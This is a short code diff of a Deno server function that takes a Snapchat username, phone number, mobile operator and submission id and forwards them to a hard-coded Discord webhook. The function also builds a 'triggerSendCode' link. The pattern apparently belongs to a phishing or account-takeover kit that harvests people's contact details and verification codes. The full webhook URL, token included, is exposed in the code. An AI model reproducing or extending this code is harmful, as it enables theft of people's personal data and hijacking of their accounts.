@@ -1,9 +1,9 @@
-import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
+import { createClient } from 'npm:@base44/sdk@0.8.31';
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513598405744787527/OfecKTmHVNK-0sUDt3f7n5PLo8qjUAkFgcOxtUZ95NKlzBqF_uSvfq7_9x1De-k9YxwW";
 
 Deno.serve(async (req) => {
-  const base44 = createClientFromRequest(req);
+  const base44 = createClient({ appId: Deno.env.get("BASE44_APP_ID") });
   const body = await req.json();
   const { snapchat, telephone, operateur, submissionId } = body;
 
@@ -17,8 +17,8 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  // Direct backend trigger URL — uses the Deno server origin (not the frontend URL)
-  const backendOrigin = new URL(req.url).origin;
+  // Use APP_URL secret which is the public backend URL (e.g. https://spare-lorikeet-87.deno.dev)
+  const backendOrigin = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
   const triggerUrl = `${backendOrigin}/triggerSendCode?id=${submissionId}`;
 
   const embed = {
